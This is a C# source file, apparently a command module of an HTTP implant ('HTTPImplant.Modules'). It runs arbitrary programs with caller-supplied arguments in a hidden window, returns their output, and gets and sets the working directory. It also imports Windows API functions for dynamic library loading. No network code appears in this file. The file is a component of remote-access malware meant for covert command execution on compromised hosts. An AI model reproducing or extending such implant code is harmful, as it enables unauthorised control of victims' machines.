using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Reflection.Emit;
using System.IO;

namespace HTTPImplant.Modules
{
    public class Commands
    {
        delegate uint GetCurrentDirectoryDelegate(uint nBufferLength, StringBuilder lpBuffer);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool FreeLibrary(IntPtr hModule);

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();
        public static string command(string command, string args)
        {
            string result = string.Empty;

            try
            {
                Console.WriteLine("Running: " + command + " With Args " + args);
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = command,
                    Arguments = args,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (Process process = new Process { StartInfo = startInfo })
                {
                    process.Start();

                    result = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();

                    process.WaitForExit();

                    if (!string.IsNullOrEmpty(error))
                    {
                        result += "\nError: " + error;
                    }
                }
            }
            catch (Exception ex)
            {
                result = "An error occurred: " + ex.Message;
            }

            return result;
        }
        public static string GetCurrentDir()
        {
            string path = Environment.CurrentDirectory;
            return path;
        }
        public static string SetCurrentDir(string path)
        {
            Directory.SetCurrentDirectory(path);
            string newPath = GetCurrentDir();
            return newPath;
        }
    }
}
